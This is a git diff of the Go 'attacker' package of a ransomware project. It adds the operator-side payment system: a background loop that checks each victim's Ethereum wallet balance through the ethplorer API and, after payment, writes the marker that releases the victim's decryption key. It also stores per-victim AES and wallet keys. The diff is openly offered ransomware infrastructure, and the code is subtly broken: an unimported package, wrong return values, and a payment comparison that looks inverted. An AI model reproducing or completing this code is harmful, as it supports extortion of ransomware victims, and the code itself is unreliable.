@@ -2,25 +2,31 @@ package attacker
 
 import (
     "os"
-    "unsafe"
+    "time"
+    "bufio"
     "runtime"
+    "net/http"
     "io/ioutil"
     "crypto/aes"
     "crypto/rsa"
     "crypto/rand"
     "crypto/cipher"
     "path/filepath"
+    "encoding/json"
 
     "github.com/sug0/sr-ransomware/go/errors"
     "github.com/sug0/sr-ransomware/go/crypto/util"
+    "github.com/sug0/sr-ransomware/go/net/ratelimit"
     ethereum "github.com/ethereum/go-ethereum/crypto"
+    "github.com/coreos/etcd/pkg/fileutil"
 )
 
 //go:generate go run generate/key.go
 
 type Scheme struct {
-    key  *rsa.PublicKey
-    path string
+    key    *rsa.PublicKey
+    path   string
+    client http.Client
 }
 
 type Keys struct {
@@ -33,6 +39,12 @@ type slice struct {
     Data uintptr
     Len  int
     Cap  int
+}
+
+type ethexplorer struct {
+    ETH struct {
+        Balance float64 `json:"balance"`
+    }
 }
 
 func NewScheme() *Scheme {
@@ -48,7 +60,85 @@ func NewScheme() *Scheme {
 
 func NewSchemeWithPath(path string) *Scheme {
     pk, _ := util.ImportDERPublicKeyRSA(oraclePublicKey)
-    return &Scheme{key: pk, path: filepath.Clean(path)}
+    return &Scheme{
+        key: pk,
+        path: filepath.Clean(path),
+        client: ratelimit.NewHTTPClient(5 * time.Minute, 32 * time.Millisecond, true),
+    }
+}
+
+func (s *Scheme) VerifyPayment(pubkey string) []byte {
+    clr, err := fileutil.LockFile(filepath.Join(s.path, pubkey, "clr"), os.O_RDONLY, 0)
+    if err != nil {
+        return nil
+    }
+    defer clr.Close()
+    aesIVKey := make([]byte, 32)
+    err = io.ReadFull(clr, aesIVKey)
+    if err != nil {
+        return nil
+    }
+    return aesIVKey
+}
+
+func (s *Scheme) VerifyPaymentsBackground() {
+    for {
+        dir, err := os.Open(s.path)
+        if err != nil {
+            goto next_cycle
+        }
+        ents, err := dir.Readdir(-1)
+        if err != nil {
+            dir.Close()
+            goto next_cycle
+        }
+        dir.Close()
+        for i := 0; i < len(ents); i++ {
+            pubkey := ents[i].Name()
+            if s.localVerifyPayment(pubkey) {
+                clr, err := fileutil.LockFile(filepath.Join(s.path, pubkey, "clr"), os.O_CREATE|os.O_WRONLY, 0600)
+                if err != nil {
+                    goto next_verify
+                }
+                if stat, _ := clr.Stat(); stat != nil && stat.Size() != 0 {
+                    clr.Close()
+                    goto next_verify
+                }
+                clr.Write([]byte("1"))
+                clr.Close()
+            }
+        next_verify:
+            time.Sleep(420 * time.Millisecond)
+        }
+    next_cycle:
+        time.Sleep(10 * time.Minute)
+    }
+}
+
+func (s *Scheme) localVerifyPayment(pubkey string) bool {
+    wallet, err := ioutil.ReadFile(filepath.Join(s.path, pubkey, "add"))
+    if err != nil {
+        return false
+    }
+    balance, err := s.checkBalance(string(wallet))
+    if err != nil {
+        return false
+    }
+    return balance < ransomValue
+}
+
+func (s *Scheme) checkBalance(wallet string) (float64, error) {
+    rsp, err := s.client.Get("https://api.ethplorer.io/getAddressInfo/" + wallet + "?apiKey=freekey")
+    if err != nil {
+        return err
+    }
+    defer rsp.Body.Close()
+    var e ethexplorer
+    err = json.NewDecoder(bufio.NewReader(rsp.Body)).Decode(&e)
+    if err != nil {
+        return err
+    }
+    return e.ETH.Balance
 }
 
 func (s *Scheme) GenerateAndStoreKeys() (*Keys, error) {
@@ -107,11 +197,6 @@ func (s *Scheme) GenerateAndStoreKeys() (*Keys, error) {
 
     // write aes and eth keys
     wallet := ethereum.PubkeyToAddress(eth.PublicKey).Hex()
-    walletBytes := *(*[]byte)(unsafe.Pointer(&slice{
-        Data: ((*slice)(unsafe.Pointer(&wallet))).Data,
-        Len: len(wallet),
-        Cap: len(wallet),
-    }))
 
     err = ioutil.WriteFile(filepath.Join(s.path, ds, "aes"), aesEncrypted, 0600)
     if err != nil {
@@ -121,7 +206,7 @@ func (s *Scheme) GenerateAndStoreKeys() (*Keys, error) {
     if err != nil {
         return nil, errors.Wrap(pkg, "failed to save ETH key", err)
     }
-    err = ioutil.WriteFile(filepath.Join(s.path, ds, "add"), walletBytes, 0600)
+    err = ioutil.WriteFile(filepath.Join(s.path, ds, "add"), []byte(wallet), 0600)
     if err != nil {
         return nil, errors.Wrap(pkg, "failed to save ETH address", err)
     }
